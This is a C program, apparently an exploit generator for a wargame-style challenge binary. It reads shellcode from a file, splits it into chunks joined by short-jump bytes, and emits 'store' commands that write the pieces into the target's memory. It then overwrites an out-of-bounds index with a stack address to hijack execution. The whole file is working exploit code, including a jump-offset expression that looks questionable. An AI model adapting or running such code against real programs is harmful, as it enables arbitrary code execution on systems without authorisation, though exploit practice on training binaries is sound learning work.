#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <strings.h>

# define PAGE_SIZE 1UL << 12UL
int	main(int argc, char **argv)
{
	static char	buffer[PAGE_SIZE];
	FILE *file = fopen(argv[1], "r");

	if (!file)
		exit(EXIT_FAILURE);
	size_t ret = fread(buffer, PAGE_SIZE, 1, file);

	uint32_t	i = 0;
	uint32_t	pos = 1;

	char	*instructions[16];
	size_t	lens[16] = {
		2,
		1,
		1,
		1,
		4,
		2,
		1,
		2,
		5,
		5,
		2,
		1,
		1,
		1,
		2,
		2,
	};
	uint32_t	offset = 0;
	while (i < 16) {
		uint32_t	u = 0;
		assert(instructions[i] = malloc(lens[i]));
		bzero(instructions[i], lens[i]);
		while (u < lens[i]) {
			instructions[i][u] = buffer[offset + u];
			u++;
		}
		offset += u;
		i++;
	}

	i = 0;
	size_t	size = 0;
	while (i < 16)
	{
		size += lens[i] + 2;
		i++;
	}

	char	payload[size];

	offset = 0;
	i = 0;
	while (i < 16)
	{
		uint32_t u = 0;

		/* printf("store\n"); */
		while (u < lens[i])
		{
			payload[offset + u] = instructions[i][u];
			u++;
		}
		offset += u;
		payload[offset] = 0xEB;
		payload[offset + 1] = 12 < lens[i];
		offset += 2;
		i++;
	}

	i = 0;
	offset = 0;
	pos = 1;
	int	*pload = (int *)(void *)payload;
	while (i < 16)
	{
		uint32_t	dword_size = (lens[i] + 2) / 4 + !!((lens[i] + 2) % 4);
		uint32_t	u = 0;

		uint32_t	old_pos = pos;
		while (u < dword_size)
		{
			printf("store\n");
			printf("%d\n", pload[offset + u]);
			printf("%d\n", pos);
			pos += 1;

			u++;
		}
		pos = old_pos + 3;
		offset += u;
		i++;
	}
	/* while (i < ret) */
	/* { */
	/* 	printf("store\n%d\n%d", somevalue 0xEB << 0x8 | >>, pos); */
	/* 	i++; */
	/* 	pos += 3; */
	/* } */
	printf("store\n3221221264\n104\nquit\n");
	return (EXIT_FAILURE);
}
